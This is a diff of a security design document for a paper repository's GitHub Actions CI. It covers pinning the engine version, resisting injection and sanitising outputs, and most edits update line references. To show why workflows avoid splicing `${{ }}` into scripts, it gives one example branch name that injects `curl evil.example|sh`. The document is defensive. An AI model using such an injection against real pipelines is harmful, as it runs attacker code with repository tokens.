@@ -115,7 +115,7 @@ The artifact's files are untrusted in the same way its values are. A paper previ
 
 ### Which engine code runs
 
-The composite action [checks the engine out](src:templates/paper/.github/actions/engine/action.yml#L64-L68) from two settings:
+The composite action [checks the engine out](src:templates/paper/.github/actions/engine/action.yml#L71-L75) from two settings:
 
 - `pins.yml` names the engine repository (gated, see [Who can change what](#design-paper-ci-codeowners)).
 - The paper's own `myst.yml` names the version, under `project.options.oaktree-sapling.version`. It is ungated, so an author can move their paper to a newer engine in an ordinary pull request.
@@ -127,9 +127,9 @@ Pinning the repository and letting only the version float keeps the version insi
 
 (r41)=
 
-The action's [`ref` step](src:templates/paper/.github/actions/engine/action.yml#L36-L49) limits the version to a release tag, `vX.Y.Z` or a pre-release like `vX.Y.Z-dev.N`, on every event, before the engine is checked out. A raw commit, a `refs/pull/N/merge` or a branch is refused, so a paper's pull request naming one goes red while it is still under review, and a version on `main` that names one stops every job there. The rule holds on `main` too because `myst.yml` is ungated, and because GitHub serves a commit pushed to any fork of the engine under the engine repository's own name. Engine changes are tested from a `-dev.N` pre-release ([Releasing](src:RELEASING.md)). The engine's [`ci/run.sh`](src:ci/run.sh#L10-L15) also refuses to run without `dist/cli.cjs`, which is committed onto [release tags](#r57) and nothing else.
+The action's [`ref` step](src:templates/paper/.github/actions/engine/action.yml#L36-L56) limits the version to a release tag, `vX.Y.Z` or a dev release `vX.Y.Z-dev.N`, on every event, before the engine is checked out. A raw commit, a `refs/pull/N/merge` or a branch is refused, so a paper's pull request naming one goes red while it is still under review, and a version on `main` that names one stops every job there. The rule holds on `main` too because `myst.yml` is ungated, and because GitHub serves a commit pushed to any fork of the engine under the engine repository's own name. Engine changes are tested from a `-dev.N` pre-release ([Releasing](src:RELEASING.md)). The engine's [`ci/run.sh`](src:ci/run.sh#L10-L15) also refuses to run without `dist/cli.cjs`, which is committed onto [release tags](#r57) and nothing else.
 
-The same step refuses a version below `min_engine_version` in `pins.yml`, the oldest engine the workflows beside it work with. The workflows leave some checks to the engine, such as [checking the pull request number](#design-paper-ci-stage2-inputs) a fork's artifact names, and read outputs an older engine lacks. A missing output reads as empty, so an older engine skips those checks without an error. [`oak upgrade`](src:src/upgrade.ts#L290-L305) keeps the version at or above it too, but the version can also change in an ordinary pull request.
+The same step refuses a version below `min_engine_version` in `pins.yml`, the oldest engine the workflows beside it work with. The workflows leave some checks to the engine, such as [checking the pull request number](#design-paper-ci-stage2-inputs) a fork's artifact names, and read outputs an older engine lacks. A missing output reads as empty, so an older engine skips those checks without an error. [`oak upgrade`](src:src/upgrade.ts#L266-L279) keeps the version at or above it too, ordering versions the same way (a dev release before its release), but the version can also change in an ordinary pull request. `oak build`, `oak validate`, `oak start` and `oak upgrade` accept the same versions as this step, from `ENGINE_VERSION` in [`schema.ts`](src:src/schema.ts).
 
 The check runs in the workflow because it decides which engine to fetch, so there is no engine yet to run it.
 
@@ -170,11 +170,11 @@ Beyond the summary at the top of this page, these gaps remain:
 
 (r153)=
 
-A workflow passes a value to a `run:` script through `env:`, not by splicing `${{ }}` into the script body. The runner substitutes a spliced expression as text before bash parses the line, so a fork could name its branch `x";curl evil.example|sh;"` and get `${{ github.head_ref }}` spliced into a script. The composite action's [`dispatch` step](src:templates/paper/.github/actions/engine/action.yml#L77-L86) needs its arguments to word-split, and does that with `set -f` so a `*` in an argument stays a `*`. [`test/frozen-guards.test.ts`](src:test/frozen-guards.test.ts#L210-L213) fails on any frozen `run:` containing `${{`, to avoid this weakness "class" in the future.
+A workflow passes a value to a `run:` script through `env:`, not by splicing `${{ }}` into the script body. The runner substitutes a spliced expression as text before bash parses the line, so a fork could name its branch `x";curl evil.example|sh;"` and get `${{ github.head_ref }}` spliced into a script. The composite action's [`dispatch` step](src:templates/paper/.github/actions/engine/action.yml#L84-L93) needs its arguments to word-split, and does that with `set -f` so a `*` in an argument stays a `*`. [`test/frozen-guards.test.ts`](src:test/frozen-guards.test.ts#L217-L220) fails on any frozen `run:` containing `${{`, to avoid this weakness "class" in the future.
 
 (r155)=
 
-Any value written to `$GITHUB_OUTPUT` is checked before writing. The file is line-oriented, so a value containing a newline appends a second `name=value` pair of the writer's choosing to the step's outputs. The engine version can carry fork-controlled text: the action's [`ref` step](src:templates/paper/.github/actions/engine/action.yml#L24-L50) reads it out of the paper's own `myst.yml`, where a YAML block scalar can span two lines, and refuses anything that is not a release tag. So can the verb's result: [`ci/run.sh`](src:ci/run.sh#L55-L63) writes it as one `result=` line of JSON, with any line break removed, and the workflows read it with `fromJSON`.
+Any value written to `$GITHUB_OUTPUT` is checked before writing. The file is line-oriented, so a value containing a newline appends a second `name=value` pair of the writer's choosing to the step's outputs. The engine version can carry fork-controlled text: the action's [`ref` step](src:templates/paper/.github/actions/engine/action.yml#L24-L57) reads it out of the paper's own `myst.yml`, where a YAML block scalar can span two lines, and refuses anything that is not a release tag. So can the verb's result: [`ci/run.sh`](src:ci/run.sh#L55-L63) writes it as one `result=` line of JSON, with any line break removed, and the workflows read it with `fromJSON`.
 
 (design-paper-ci-bad-input)=
 
@@ -182,7 +182,7 @@ Any value written to `$GITHUB_OUTPUT` is checked before writing. The file is lin
 
 (r97)=
 
-The engine repository in `pins.yml` and the version in `myst.yml` both fail loudly when absent. `yq` prints the literal `null` for a missing key; the [`ref`](src:templates/paper/.github/actions/engine/action.yml#L30-L35) and [`pins`](src:templates/paper/.github/actions/engine/action.yml#L55-L60) steps stop with the file and the key instead.
+The engine repository in `pins.yml` and the version in `myst.yml` both fail loudly when absent. `yq` prints the literal `null` for a missing key; the [`ref`](src:templates/paper/.github/actions/engine/action.yml#L30-L35) and [`pins`](src:templates/paper/.github/actions/engine/action.yml#L62-L67) steps stop with the file and the key instead.
 
 (r137)=
 
@@ -220,7 +220,7 @@ Both stages key on the head repository, and the pull request group in each Stage
 
 (r172)=
 
-A workflow reads a secret into `env:` and tests it in `run:`[^why-test-secret-in-run]. A `secrets` reference in a step's `if:` makes GitHub reject the whole workflow file. For a file that only runs on `workflow_dispatch`, such as `reserve-doi.yml`, the rejection shows only when someone runs it. [`test/frozen-guards.test.ts`](src:test/frozen-guards.test.ts#L244-L249) fails on any frozen `if:` that reads `secrets`.
+A workflow reads a secret into `env:` and tests it in `run:`[^why-test-secret-in-run]. A `secrets` reference in a step's `if:` makes GitHub reject the whole workflow file. For a file that only runs on `workflow_dispatch`, such as `reserve-doi.yml`, the rejection shows only when someone runs it. [`test/frozen-guards.test.ts`](src:test/frozen-guards.test.ts#L251-L256) fails on any frozen `if:` that reads `secrets`.
 
 [^why-test-secret-in-run]: The `secrets` context does not exist in a step-level `if:`.
 
@@ -230,10 +230,10 @@ A workflow reads a secret into `env:` and tests it in `run:`[^why-test-secret-in
 
 (r99)=
 
-[`test/frozen-guards.test.ts`](src:test/frozen-guards.test.ts#L29-L41) pulls a step's `run:` script out of the YAML and executes it as bash. A test that only asserted which files `oak bootstrap` stamps into a repository would pass with every guard on this page deleted, and these files run in every paper repository with the tokens described above.
+[`test/frozen-guards.test.ts`](src:test/frozen-guards.test.ts#L35-L47) pulls a step's `run:` script out of the YAML and executes it as bash. A test that only asserted which files `oak bootstrap` stamps into a repository would pass with every guard on this page deleted, and these files run in every paper repository with the tokens described above.
 
 (r90)=
 
-Each guard carries a case that fails against the unfixed step, for example [the `refs/pull/7/merge` case](src:test/frozen-guards.test.ts#L77-L84) for the `ref` step and [the fabricated pull request number](src:test/artifact.test.ts#L50-L62) for `verifyPrHead`. A guard written against a specific attack is tested with that attack's input.
+Each guard carries a case that fails against the unfixed step, for example [the `refs/pull/7/merge` case](src:test/frozen-guards.test.ts#L84-L91) for the `ref` step and [the fabricated pull request number](src:test/artifact.test.ts#L50-L62) for `verifyPrHead`. A guard written against a specific attack is tested with that attack's input.
 
 This is bash, not a runner: `${{ }}` is already resolved by the time a real step runs, `$GITHUB_OUTPUT` is a real file there, and the shell setup differs. So it covers script logic plus the expression-level faults checked statically. A green run here is necessary and not sufficient, and the live conformance run exercises the workflows on a real runner.
